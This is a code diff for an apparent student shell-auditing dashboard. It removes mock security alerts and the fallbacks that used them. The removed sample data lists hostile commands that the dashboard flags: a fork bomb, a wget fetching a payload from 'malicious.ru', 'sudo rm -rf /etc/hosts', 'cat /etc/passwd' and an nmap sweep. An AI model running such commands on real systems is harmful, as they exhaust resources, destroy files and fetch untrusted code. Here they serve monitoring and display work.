@@ -5,15 +5,6 @@ import type { SecurityAlert } from '../types';
 import { collection, getDocs, onSnapshot, query, orderBy, doc, writeBatch } from 'firebase/firestore';
 import { db } from '../config/firebase';
 
-const MOCK_ALERTS: SecurityAlert[] = [
-  { id: 'al-01', timestamp: '14:24:12', command: 'sudo apt update', flagType: 'sudo', level: 'warn', studentEmail: 'john_doe@shellx.com' },
-  { id: 'al-02', timestamp: '14:26:01', command: ':(){ :|:& };:', flagType: 'fork_bomb', level: 'critical', studentEmail: 'alex_m@shellx.com' },
-  { id: 'al-03', timestamp: '14:28:44', command: 'nmap -sP 192.168.1.0/24', flagType: 'port_scan', level: 'critical', studentEmail: 'mike_r@shellx.com' },
-  { id: 'al-04', timestamp: '14:30:15', command: 'wget http://malicious.ru/payload.sh', flagType: 'malicious_script', level: 'warn', studentEmail: 'lucas_s@shellx.com' },
-  { id: 'al-05', timestamp: '14:32:00', command: 'sudo rm -rf /etc/hosts', flagType: 'sudo', level: 'critical', studentEmail: 'sarah_c@shellx.com' },
-  { id: 'al-06', timestamp: '14:33:10', command: 'cat /etc/passwd', flagType: 'malicious_script', level: 'info', studentEmail: 'emma_w@shellx.com' },
-];
-
 export const AuditsScreen: React.FC = () => {
   const [alerts, setAlerts] = useState<SecurityAlert[]>([]);
   const [isLoading, setIsLoading] = useState(true);
@@ -54,15 +45,11 @@ export const AuditsScreen: React.FC = () => {
         };
       });
       
-      if (list.length === 0) {
-        setAlerts(MOCK_ALERTS);
-      } else {
-        setAlerts(list);
-      }
+      setAlerts(list);
       setIsLoading(false);
     }, (error) => {
       console.error('Error fetching security alerts:', error);
-      setAlerts(MOCK_ALERTS);
+      setAlerts([]);
       setIsLoading(false);
     });
     
